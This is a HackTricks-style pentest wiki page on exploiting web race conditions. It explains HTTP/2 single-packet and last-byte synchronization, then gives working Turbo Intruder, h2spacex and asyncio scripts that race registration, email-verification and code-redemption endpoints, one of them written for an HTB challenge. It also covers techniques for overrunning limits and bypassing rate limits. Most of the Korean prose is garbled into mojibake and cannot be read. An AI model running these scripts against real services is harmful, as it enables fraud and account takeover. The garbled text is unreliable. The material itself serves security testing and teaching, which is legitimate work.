# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì§€ê¸ˆ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ **íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

{% hint style="warning" %}
ì´ ê¸°ìˆ ì— ëŒ€í•œ ê¹Šì€ ì´í•´ë¥¼ ì–»ìœ¼ë ¤ë©´ [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)ì—ì„œ ì›ë³¸ ë³´ê³ ì„œë¥¼ í™•ì¸í•˜ì„¸ìš”.
{% endhint %}

## ë ˆì´ìŠ¤ ì¡°ê±´ ê³µê²© ê°•í™”

ë ˆì´ìŠ¤ ì¡°ê±´ì„ ì´ìš©í•˜ëŠ” ë° ìˆì–´ ì£¼ìš” ì¥ì• ë¬¼ì€ ì—¬ëŸ¬ ìš”ì²­ì´ ë™ì‹œì— ì²˜ë¦¬ë˜ë„ë¡ ë³´ì¥í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. **ì²˜ë¦¬ ì‹œê°„ì˜ ì°¨ì´ê°€ ë§¤ìš° ì ì–´ì•¼ í•˜ë©°, ì´ìƒì ìœ¼ë¡œëŠ” 1ms ë¯¸ë§Œì´ì–´ì•¼ í•©ë‹ˆë‹¤.**

ì—¬ê¸° ìš”ì²­ ë™ê¸°í™”ë¥¼ ìœ„í•œ ëª‡ ê°€ì§€ ê¸°ìˆ ì´ ìˆìŠµë‹ˆë‹¤:

#### HTTP/2 ë‹¨ì¼ íŒ¨í‚· ê³µê²© vs. HTTP/1.1 ë§ˆì§€ë§‰ ë°”ì´íŠ¸ ë™ê¸°í™”

* **HTTP/2**: ë‹¨ì¼ TCP ì—°ê²°ì„ í†µí•´ ë‘ ê°œì˜ ìš”ì²­ì„ ì „ì†¡í•  ìˆ˜ ìˆì–´ ë„¤íŠ¸ì›Œí¬ ì§€í„°ì˜ ì˜í–¥ì„ ì¤„ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì„œë²„ ì¸¡ ë³€ë™ìœ¼ë¡œ ì¸í•´ ë‘ ê°œì˜ ìš”ì²­ë§Œìœ¼ë¡œëŠ” ì¼ê´€ëœ ë ˆì´ìŠ¤ ì¡°ê±´ ê³µê²©ì´ ë¶ˆê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **HTTP/1.1 'ë§ˆì§€ë§‰ ë°”ì´íŠ¸ ë™ê¸°í™”'**: 20-30ê°œì˜ ìš”ì²­ì˜ ëŒ€ë¶€ë¶„ì„ ë¯¸ë¦¬ ì „ì†¡í•˜ê³ , ì‘ì€ ì¡°ê°ì„ ë³´ë¥˜í•œ í›„ í•¨ê»˜ ì „ì†¡í•˜ì—¬ ì„œë²„ì— ë™ì‹œì— ë„ì°©í•˜ë„ë¡ í•©ë‹ˆë‹¤.

**ë§ˆì§€ë§‰ ë°”ì´íŠ¸ ë™ê¸°í™”ë¥¼ ìœ„í•œ ì¤€ë¹„**ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. ìŠ¤íŠ¸ë¦¼ì„ ì¢…ë£Œí•˜ì§€ ì•Šê³  ë§ˆì§€ë§‰ ë°”ì´íŠ¸ë¥¼ ì œì™¸í•œ í—¤ë”ì™€ ë³¸ë¬¸ ë°ì´í„°ë¥¼ ì „ì†¡í•©ë‹ˆë‹¤.
2. ì´ˆê¸° ì „ì†¡ í›„ 100ms ë™ì•ˆ ì¼ì‹œ ì¤‘ì§€í•©ë‹ˆë‹¤.
3. TCP\_NODELAYë¥¼ ë¹„í™œì„±í™”í•˜ì—¬ Nagleì˜ ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•˜ì—¬ ìµœì¢… í”„ë ˆì„ì„ ë°°ì¹˜í•©ë‹ˆë‹¤.
4. ì—°ê²°ì„ ì¤€ë¹„í•˜ê¸° ìœ„í•´ í•‘ì„ ë³´ëƒ…ë‹ˆë‹¤.

ë³´ë¥˜ëœ í”„ë ˆì„ì„ ì´í›„ì— ì „ì†¡í•˜ë©´ ë‹¨ì¼ íŒ¨í‚·ìœ¼ë¡œ ë„ì°©í•´ì•¼ í•˜ë©°, Wiresharkë¥¼ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì¼ë°˜ì ìœ¼ë¡œ RC ê³µê²©ì— í¬í•¨ë˜ì§€ ì•ŠëŠ” ì •ì  íŒŒì¼ì—ëŠ” ì ìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

### ì„œë²„ ì•„í‚¤í…ì²˜ì— ì ì‘í•˜ê¸°

ëŒ€ìƒì˜ ì•„í‚¤í…ì²˜ë¥¼ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. í”„ë¡ íŠ¸ì—”ë“œ ì„œë²„ëŠ” ìš”ì²­ì„ ë‹¤ë¥´ê²Œ ë¼ìš°íŒ…í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” íƒ€ì´ë°ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤. ë¬´ì˜ë¯¸í•œ ìš”ì²­ì„ í†µí•´ ì„œë²„ ì¸¡ ì—°ê²°ì„ ë¯¸ë¦¬ ì¤€ë¹„í•˜ë©´ ìš”ì²­ íƒ€ì´ë°ì„ ì •ìƒí™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ì„¸ì…˜ ê¸°ë°˜ ì ê¸ˆ ì²˜ë¦¬

PHPì˜ ì„¸ì…˜ í•¸ë“¤ëŸ¬ì™€ ê°™ì€ í”„ë ˆì„ì›Œí¬ëŠ” ì„¸ì…˜ë³„ë¡œ ìš”ì²­ì„ ì§ë ¬í™”í•˜ì—¬ ì·¨ì•½ì ì„ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê° ìš”ì²­ì— ëŒ€í•´ ë‹¤ë¥¸ ì„¸ì…˜ í† í°ì„ ì‚¬ìš©í•˜ë©´ ì´ ë¬¸ì œë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ì†ë„ ë˜ëŠ” ë¦¬ì†ŒìŠ¤ í•œê³„ ê·¹ë³µ

ì—°ê²° ì¤€ë¹„ê°€ íš¨ê³¼ì ì´ì§€ ì•Šì€ ê²½ìš°, ë”ë¯¸ ìš”ì²­ì˜ í™ìˆ˜ë¥¼ í†µí•´ ì›¹ ì„œë²„ì˜ ì†ë„ ë˜ëŠ” ë¦¬ì†ŒìŠ¤ í•œê³„ ì§€ì—°ì„ ì˜ë„ì ìœ¼ë¡œ ìœ ë°œí•˜ì—¬ ë ˆì´ìŠ¤ ì¡°ê±´ì— ìœ ë¦¬í•œ ì„œë²„ ì¸¡ ì§€ì—°ì„ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ê³µê²© ì˜ˆì‹œ

* **Tubo Intruder - HTTP2 ë‹¨ì¼ íŒ¨í‚· ê³µê²© (1 ì—”ë“œí¬ì¸íŠ¸)**: ìš”ì²­ì„ **Turbo intruder**ì— ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), ìš”ì²­ì—ì„œ **`%s`**ì— ëŒ€í•´ ê°•ì œë¡œ ë³€í™˜í•  ê°’ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆ: `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` ê·¸ë¦¬ê³  ë“œë¡­ë‹¤ìš´ì—ì„œ **`examples/race-single-packer-attack.py`**ë¥¼ ì„ íƒí•©ë‹ˆë‹¤:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

ë‹¤ë¥¸ ê°’ì„ **ë³´ë‚´ë ¤ë©´**, í´ë¦½ë³´ë“œì—ì„œ ë‹¨ì–´ ëª©ë¡ì„ ì‚¬ìš©í•˜ëŠ” ì´ ì½”ë“œë¡œ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
ì›¹ì´ HTTP2ë¥¼ ì§€ì›í•˜ì§€ ì•ŠëŠ” ê²½ìš°(ì˜¤ì§ HTTP1.1ë§Œ ì§€ì›) `Engine.THREADED` ë˜ëŠ” `Engine.BURP`ë¥¼ `Engine.BURP2` ëŒ€ì‹  ì‚¬ìš©í•˜ì„¸ìš”.
{% endhint %}

* **Tubo Intruder - HTTP2 ë‹¨ì¼ íŒ¨í‚· ê³µê²© (ì—¬ëŸ¬ ì—”ë“œí¬ì¸íŠ¸)**: RCEë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ 1ê°œì˜ ì—”ë“œí¬ì¸íŠ¸ì— ìš”ì²­ì„ ë³´ë‚´ê³  ê·¸ í›„ ì—¬ëŸ¬ ì—”ë“œí¬ì¸íŠ¸ì— ìš”ì²­ì„ ë³´ë‚´ì•¼ í•˜ëŠ” ê²½ìš°, `race-single-packet-attack.py` ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Burp Suiteì˜ ìƒˆë¡œìš´ '**ë³‘ë ¬ë¡œ ê·¸ë£¹ ì „ì†¡**' ì˜µì…˜ì„ í†µí•´ **Repeater**ì—ì„œë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **limit-overrun**ì˜ ê²½ìš°, ê·¸ë£¹ì— **ê°™ì€ ìš”ì²­ì„ 50ë²ˆ ì¶”ê°€**í•˜ë©´ ë©ë‹ˆë‹¤.
* **connection warming**ì„ ìœ„í•´, **ê·¸ë£¹ì˜ ì‹œì‘ ë¶€ë¶„**ì— ì›¹ ì„œë²„ì˜ ë¹„ì •ì  ë¶€ë¶„ì— ëŒ€í•œ **ìš”ì²­**ì„ **ì¶”ê°€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì§€ì—°**ì„ ìœ„í•´ **í•˜ë‚˜ì˜ ìš”ì²­ê³¼ ë‹¤ë¥¸ ìš”ì²­ ê°„**ì˜ ì²˜ë¦¬ **ì‚¬ì´**ì— 2ë‹¨ê³„ í•˜ìœ„ ìƒíƒœì—ì„œ **ì¶”ê°€ ìš”ì²­ì„ ì¶”ê°€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ë‹¤ì¤‘ ì—”ë“œí¬ì¸íŠ¸** RCì˜ ê²½ìš°, **ìˆ¨ê²¨ì§„ ìƒíƒœë¡œ ê°€ëŠ” ìš”ì²­**ì„ ë¨¼ì € ë³´ë‚´ê³ , ê·¸ ë’¤ì— **ìˆ¨ê²¨ì§„ ìƒíƒœë¥¼ ì•…ìš©í•˜ëŠ” 50ê°œì˜ ìš”ì²­**ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **ìë™í™”ëœ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸**: ì´ ìŠ¤í¬ë¦½íŠ¸ì˜ ëª©í‘œëŠ” ì‚¬ìš©ìì˜ ì´ë©”ì¼ì„ ë³€ê²½í•˜ë©´ì„œ ìƒˆë¡œìš´ ì´ë©”ì¼ì˜ í™•ì¸ í† í°ì´ ë§ˆì§€ë§‰ ì´ë©”ì¼ë¡œ ë„ì°©í•  ë•Œê¹Œì§€ ì§€ì†ì ìœ¼ë¡œ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤(ì´ëŠ” ì½”ë“œì—ì„œ ì´ë©”ì¼ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” RCê°€ ë°œê²¬ë˜ì—ˆì§€ë§Œ í™•ì¸ì´ ì´ì „ ì´ë©”ì¼ë¡œ ì „ì†¡ë˜ë„ë¡ ì´ë¯¸ ì²« ë²ˆì§¸ ì´ë©”ì¼ë¡œ ì±„ì›Œì§„ ë³€ìˆ˜ê°€ ìˆì—ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤).\
"objetivo"ë¼ëŠ” ë‹¨ì–´ê°€ ìˆ˜ì‹ ëœ ì´ë©”ì¼ì—ì„œ ë°œê²¬ë˜ë©´ ë³€ê²½ëœ ì´ë©”ì¼ì˜ í™•ì¸ í† í°ì„ ìˆ˜ì‹ í•œ ê²ƒì´ë©° ê³µê²©ì„ ì¢…ë£Œí•©ë‹ˆë‹¤.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Improving Single Packet Attack

ì›ë˜ ì—°êµ¬ì—ì„œëŠ” ì´ ê³µê²©ì´ 1,500 ë°”ì´íŠ¸ì˜ í•œê³„ë¥¼ ê°€ì§€ê³  ìˆë‹¤ê³  ì„¤ëª…í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ [**ì´ ê²Œì‹œë¬¼**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)ì—ì„œëŠ” IP ë ˆì´ì–´ ë¶„í• ì„ ì‚¬ìš©í•˜ì—¬ ë‹¨ì¼ íŒ¨í‚· ê³µê²©ì˜ 1,500 ë°”ì´íŠ¸ ì œí•œì„ **TCPì˜ 65,535 B ìœˆë„ìš° ì œí•œìœ¼ë¡œ í™•ì¥í•˜ëŠ” ë°©ë²•**ì´ ì„¤ëª…ë˜ì—ˆìŠµë‹ˆë‹¤(ë‹¨ì¼ íŒ¨í‚·ì„ ì—¬ëŸ¬ IP íŒ¨í‚·ìœ¼ë¡œ ë‚˜ëˆ„ê³  ì„œë¡œ ë‹¤ë¥¸ ìˆœì„œë¡œ ì „ì†¡í•˜ì—¬ ëª¨ë“  ì¡°ê°ì´ ì„œë²„ì— ë„ë‹¬í•  ë•Œê¹Œì§€ íŒ¨í‚· ì¬ì¡°ë¦½ì„ ë°©ì§€í•¨). ì´ ê¸°ìˆ ì„ í†µí•´ ì—°êµ¬ìëŠ” ì•½ 166ms ë§Œì— 10,000ê°œì˜ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&#x20;

ì´ ê°œì„ ì´ ìˆ˜ë°±/ìˆ˜ì²œ ê°œì˜ íŒ¨í‚·ì´ ë™ì‹œì— ë„ì°©í•´ì•¼ í•˜ëŠ” RCì—ì„œ ê³µê²©ì„ ë” ì‹ ë¢°í•  ìˆ˜ ìˆê²Œ ë§Œë“¤ì§€ë§Œ, ì¼ë¶€ ì†Œí”„íŠ¸ì›¨ì–´ ì œí•œì´ ìˆì„ ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤. Apache, Nginx ë° Goì™€ ê°™ì€ ì¼ë¶€ ì¸ê¸° ìˆëŠ” HTTP ì„œë²„ëŠ” ê°ê° 100, 128 ë° 250ìœ¼ë¡œ ì„¤ì •ëœ ì—„ê²©í•œ `SETTINGS_MAX_CONCURRENT_STREAMS` ì„¤ì •ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ NodeJS ë° nghttp2ì™€ ê°™ì€ ë‹¤ë¥¸ ì„œë²„ëŠ” ë¬´ì œí•œì…ë‹ˆë‹¤.\
ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ Apacheê°€ ë‹¨ì¼ TCP ì—°ê²°ì—ì„œ 100ê°œì˜ HTTP ì—°ê²°ë§Œ ê³ ë ¤í•œë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤(ì´ RC ê³µê²©ì„ ì œí•œí•¨).

ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ëŠ” ëª‡ ê°€ì§€ ì˜ˆëŠ” ë ˆí¬ì§€í† ë¦¬ [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Raw BF

ì´ì „ ì—°êµ¬ ì´ì „ì— RCë¥¼ ìœ ë°œí•˜ê¸° ìœ„í•´ íŒ¨í‚·ì„ ê°€ëŠ¥í•œ í•œ ë¹ ë¥´ê²Œ ì „ì†¡í•˜ë ¤ê³  ì‹œë„í•œ ëª‡ ê°€ì§€ í˜ì´ë¡œë“œê°€ ìˆì—ˆìŠµë‹ˆë‹¤.

* **Repeater:** ì´ì „ ì„¹ì…˜ì˜ ì˜ˆë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.
* **Intruder**: **Intruder**ì— **ìš”ì²­**ì„ ë³´ë‚´ê³ , **ì˜µì…˜ ë©”ë‰´**ì—ì„œ **ìŠ¤ë ˆë“œ ìˆ˜**ë¥¼ **30**ìœ¼ë¡œ ì„¤ì •í•˜ê³ , í˜ì´ë¡œë“œë¡œ **Null payloads**ë¥¼ ì„ íƒí•˜ê³  **30**ì„ ìƒì„±í•©ë‹ˆë‹¤.
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **íŒŒì´ì¬ - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

ì´ê²ƒì€ **í–‰ë™ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” íšŸìˆ˜ë¥¼ ì œí•œí•˜ëŠ”** ê³³ì—ì„œ **ë°œìƒí•˜ëŠ” ì·¨ì•½ì **ì˜ ê°€ì¥ ê¸°ë³¸ì ì¸ ìœ í˜•ì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì›¹ ìŠ¤í† ì–´ì—ì„œ ë™ì¼í•œ í• ì¸ ì½”ë“œë¥¼ ì—¬ëŸ¬ ë²ˆ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ì…ë‹ˆë‹¤. ë§¤ìš° ì‰¬ìš´ ì˜ˆëŠ” [**ì´ ë³´ê³ ì„œ**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ë˜ëŠ” [**ì´ ë²„ê·¸**](https://hackerone.com/reports/759247)**ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ê³µê²©ì—ëŠ” ì—¬ëŸ¬ ê°€ì§€ ë³€í˜•ì´ ìˆìŠµë‹ˆë‹¤:

* ê¸°í”„íŠ¸ ì¹´ë“œë¥¼ ì—¬ëŸ¬ ë²ˆ ì‚¬ìš©í•˜ê¸°
* ì œí’ˆì— ëŒ€í•´ ì—¬ëŸ¬ ë²ˆ í‰ê°€í•˜ê¸°
* ê³„ì¢Œ ì”ì•¡ì„ ì´ˆê³¼í•˜ì—¬ í˜„ê¸ˆì„ ì¸ì¶œí•˜ê±°ë‚˜ ì´ì²´í•˜ê¸°
* ë‹¨ì¼ CAPTCHA ì†”ë£¨ì…˜ ì¬ì‚¬ìš©í•˜ê¸°
* ë°˜ ë¸Œë£¨íŠ¸ í¬ìŠ¤ ì†ë„ ì œí•œ ìš°íšŒí•˜ê¸°

### **Hidden substates**

ë³µì¡í•œ ë ˆì´ìŠ¤ ì¡°ê±´ì„ ì•…ìš©í•˜ëŠ” ê²ƒì€ ì¢…ì¢… ìˆ¨ê²¨ì§„ ë˜ëŠ” **ì˜ë„í•˜ì§€ ì•Šì€ ê¸°ê³„ í•˜ìœ„ ìƒíƒœ**ì™€ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆëŠ” ì§§ì€ ê¸°íšŒë¥¼ ì´ìš©í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì ‘ê·¼ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. **ì ì¬ì  ìˆ¨ê²¨ì§„ í•˜ìœ„ ìƒíƒœ ì‹ë³„í•˜ê¸°**
* ì‚¬ìš©ì í”„ë¡œí•„ì´ë‚˜ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • í”„ë¡œì„¸ìŠ¤ì™€ ê°™ì€ ì¤‘ìš”í•œ ë°ì´í„°ë¥¼ ìˆ˜ì •í•˜ê±°ë‚˜ ìƒí˜¸ì‘ìš©í•˜ëŠ” ì—”ë“œí¬ì¸íŠ¸ë¥¼ íŒŒì•…í•˜ëŠ” ê²ƒë¶€í„° ì‹œì‘í•©ë‹ˆë‹¤. ë‹¤ìŒì— ì§‘ì¤‘í•˜ì„¸ìš”:
* **ì €ì¥ì†Œ**: í´ë¼ì´ì–¸íŠ¸ ì¸¡ ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ëŠ” ê²ƒë³´ë‹¤ ì„œë²„ ì¸¡ ì§€ì† ë°ì´í„°ë¥¼ ì¡°ì‘í•˜ëŠ” ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì„ í˜¸í•©ë‹ˆë‹¤.
* **ì‘ì—…**: ê¸°ì¡´ ë°ì´í„°ë¥¼ ë³€ê²½í•˜ëŠ” ì‘ì—…ì„ ì°¾ìŠµë‹ˆë‹¤. ì´ëŠ” ìƒˆë¡œìš´ ë°ì´í„°ë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒë³´ë‹¤ ì•…ìš© ê°€ëŠ¥í•œ ì¡°ê±´ì„ ìƒì„±í•  ê°€ëŠ¥ì„±ì´ ë” ë†’ìŠµë‹ˆë‹¤.
* **í‚¤ì‰**: ì„±ê³µì ì¸ ê³µê²©ì€ ì¼ë°˜ì ìœ¼ë¡œ ë™ì¼í•œ ì‹ë³„ì(ì˜ˆ: ì‚¬ìš©ì ì´ë¦„ ë˜ëŠ” ì¬ì„¤ì • í† í°)ì— í‚¤ê°€ ì§€ì •ëœ ì‘ì—…ì„ í¬í•¨í•©ë‹ˆë‹¤.
2. **ì´ˆê¸° íƒìƒ‰ ìˆ˜í–‰í•˜ê¸°**
